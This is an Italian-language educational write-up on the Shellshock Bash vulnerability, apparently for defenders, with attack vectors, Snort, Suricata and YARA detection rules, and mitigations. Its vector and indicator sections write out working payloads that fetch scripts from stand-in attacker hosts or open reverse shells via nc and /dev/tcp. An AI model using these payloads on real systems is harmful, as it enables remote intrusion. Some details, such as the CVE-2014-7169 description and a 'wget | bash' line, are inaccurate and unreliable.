# **Shellshock (CVE-2014-6271) – Vulnerabilità critica in Bash**

##Author: Crippa Luca 
---

## **1. Introduzione generale alla vulnerabilità**

Shellshock è una delle vulnerabilità più critiche mai scoperte nel software open-source. È stata identificata nel settembre 2014 e riguarda **GNU Bash**, la shell di default nella maggior parte dei sistemi **Unix, Linux e macOS**.

Questa falla consente l’**esecuzione di comandi arbitrari**, **da remoto** e **senza autenticazione**, sfruttando il modo in cui Bash gestisce le **funzioni esportate come variabili d’ambiente**.

### 🔍 Contesto d’uso di Bash

Bash (Bourne Again SHell) è un interprete dei comandi:

* Preinstallato in sistemi Linux, Unix e derivati
* Utilizzato in script, automatismi, servizi web CGI, sistemi embedded, IoT, etc.
* Attivato in background da molte applicazioni o servizi che **non mostrano esplicitamente** il suo utilizzo

---

## **2. Periodo, scoperta e classificazione**

| Voce                          | Dettaglio                                               |
| ----------------------------- | ------------------------------------------------------- |
| 📅 Data divulgazione pubblica | 24 settembre 2014                                       |
| 🔢 CVE principale             | **CVE-2014-6271**                                       |
| 🧩 Altri CVE collegati        | CVE-2014-7169, 7186, 7187, 6277, 6278                   |
| 🧪 Gravità (CVSSv2)           | **10.0 / 10** (massima)                                 |
| 💻 Sistemi impattati          | Qualsiasi sistema Unix/Linux/macOS con Bash vulnerabile |

### 🔥 Impatto globale

* Milioni di server compromessi in poche ore
* Usata in attacchi automatizzati, worm, botnet
* Sfruttata anche da APT (Advanced Persistent Threats)
* Integrazione immediata in tool come Metasploit, scanners, malware IoT

---

## **3. Dettagli tecnici dell’attacco**

### 🔬 Comportamento vulnerabile di Bash

Bash consente di **esportare funzioni** come variabili d’ambiente. In questo meccanismo si cela il bug:

```bash
env x='() { :; }; comando_malevolo' bash -c 'echo test'
```

Il parser di Bash **interpreta il contenuto dopo la funzione `}` come codice da eseguire**, invece di ignorarlo.

### 🧠 Spiegazione passo passo:

1. La variabile `x` è vista come una funzione esportata
2. Bash esegue tutto ciò che segue la chiusura della funzione
3. `comando_malevolo` viene eseguito immediatamente, prima di qualsiasi altra operazione

### ⚠️ La vulnerabilità è “pre-auth” e “pre-exec”:

* Nessuna autenticazione necessaria
* Può essere lanciata da **input remoto**, se il sistema usa Bash in background

---

## **4. Vettori di attacco reali**

### 4.1 Attacco via Web – CGI

Un web server con supporto CGI può essere vulnerabile. Il client può iniettare codice malevolo via header HTTP:

```http
GET /cgi-bin/status.sh HTTP/1.1
Host: target.com
User-Agent: () { :; }; curl http://attacker.com/rev.sh | bash
```

Il server esegue Bash per lo script `status.sh`, e inietta il contenuto dell’User-Agent come variabile d’ambiente. Il risultato:

> Il server scarica e avvia il malware/reverse shell.

---

### 4.2 Attacco via SSH – `authorized_keys`

È possibile usare `command=""` per specificare comandi remoti, ad esempio:

```bash
command="() { :; }; nc attacker.com 4444 -e /bin/bash" ssh-rsa AAAAB3...
```

Quando l’utente si connette, il server esegue Bash per interpretare il comando, che esegue direttamente la reverse shell.

---

### 4.3 Attacco via DHCP Client (es. Ubuntu)

Un server DHCP malevolo può inviare payload nello scope dell’IP di risposta:

```bash
() { :; }; wget http://attacker/payload.sh | bash
```

I client usano Bash per processare i parametri ricevuti, e quindi vengono compromessi appena collegati alla rete.

---

### 4.4 Altri vettori minori

* Servizi rsync con `--rsync-path` personalizzati
* Hook Git post-commit
* Cronjob che avviano script in Bash
* SSH forzato in ambienti chroot

---

## **5. Varianti successive e mitigazioni incomplete**

La prima patch risolveva solo la stringa classica `() { :; };`, ma i ricercatori hanno scoperto che **il bug si presentava con sintassi leggermente modificate**.

| CVE               | Problema aggiuntivo                |
| ----------------- | ---------------------------------- |
| **CVE-2014-7169** | Comandi in file `.bash_profile`    |
| **CVE-2014-7186** | Stack overflow in parsing          |
| **CVE-2014-7187** | Off-by-one parsing error           |
| **CVE-2014-6277** | Exploit più complesso via ambiente |
| **CVE-2014-6278** | Comandi bypassando blacklist       |

💡 Solo dopo **tutte** queste patch Bash è tornata sicura.

---

## **6. Tecniche di detection**

### 📘 Regole IDS/IPS

#### Snort:

```snort
alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
  msg:"Shellshock exploit attempt";
  content:"() { :; };";
  http_header;
  sid:1000012;
)
```

#### Suricata:

```yaml
alert http any any -> any any (
  msg:"Shellshock via HTTP Header";
  content:"() { :; };";
  http_header;
  classtype:web-application-attack;
  sid:100011;
)
```

---

### 🔎 Analisi dei log

* Apache, nginx, lighttpd: controllare `access.log` e `error.log`
* Cercare User-Agent, Referer o Cookie contenenti `() { :; };`
* Segni di comando bash come `nc`, `wget`, `curl`, `bash -i`

---

### 🔬 YARA Rule:

```yara
rule Shellshock {
  strings:
    $a = "() { :; };"
  condition:
    $a
}
```

---

## **7. Indicatori di compromissione (IOC)**

### ⚔️ Payload comuni:

```bash
() { :; }; /bin/bash -i >& /dev/tcp/192.168.56.101/4444 0>&1
() { :; }; nc -e /bin/sh attacker.com 1234
() { :; }; curl http://evil.site/shell.sh | bash
```

### 🕵️ Header HTTP sospetti:

```
User-Agent: () { :; }; /usr/bin/wget http://bad.domain/x
Cookie: () { :; }; echo hacked > /tmp/x
```

### 🕸️ Domini noti usati:

* `http://malware.shellshock.org`
* `http://botnet.pwned.biz/cgi-bin/exploit.sh`
* `http://autopwn.shell/bash.sh`

---

## **8. Strumenti di test**

### 🔧 Test locale:

```bash
env x='() { :; }; echo VULNERABILE' bash -c "echo test"
```
<img width="822" height="87" alt="image" src="https://github.com/user-attachments/assets/ffdbfdc0-8f3c-49bd-bc04-3629d0c8a235" />

---
**Output vulnerabile:**
```
VULNERABILE
test
```

---

### 🧪 Tool per audit

| Tool           | Funzione                               |
| -------------- | -------------------------------------- |
| **Nmap**       | Script `http-shellshock`               |
| **Nikto**      | Detect automatico su CGI               |
| **Metasploit** | Exploit `apache_mod_cgi_bash_env_exec` |
| **Burp Suite** | Fuzzing header HTTP                    |
| **Wireshark**  | Ispezione pacchetti sospetti           |

---

## **9. Difesa e mitigazione**

### ✅ Contromisure chiave:

* **Aggiornare Bash** da repo ufficiali
* **Rimuovere o riscrivere** script CGI in Bash
* Limitare uso di `authorized_keys` con comandi remoti
* Applicare policy `AppArmor` o `SELinux` su script sospetti

---

## **10. Riflessione sull’importanza**

Shellshock ha mostrato:

* Quanto **profondo** può essere l’impatto di una vulnerabilità di parsing
* L’importanza del **fuzzing e del code auditing** anche su software vecchio di decenni
* La pericolosità dell’esposizione indiretta di componenti come Bash
* Il bisogno di strumenti di monitoraggio real-time e risposta rapida

---

## 📚 Fonti tecniche affidabili

* 🔗 Red Hat Advisory:
  [https://access.redhat.com/security/cve/cve-2014-6271](https://access.redhat.com/security/cve/cve-2014-6271)
* 🔗 NIST NVD:
  [https://nvd.nist.gov/vuln/detail/CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
* 🔗 CISA Alert:
  [https://www.cisa.gov/news-events/alerts/2014/09/24/bash-command-injection-vulnerability](https://www.cisa.gov/news-events/alerts/2014/09/24/bash-command-injection-vulnerability)
* 🔗 Troy Hunt – Shellshock explained:
  [https://www.troyhunt.com/everything-you-need-to-know-about-shellshock](https://www.troyhunt.com/everything-you-need-to-know-about-shellshock)
* 🔗 OWASP Command Injection:
  [https://owasp.org/www-community/attacks/Command\_Injection](https://owasp.org/www-community/attacks/Command_Injection)
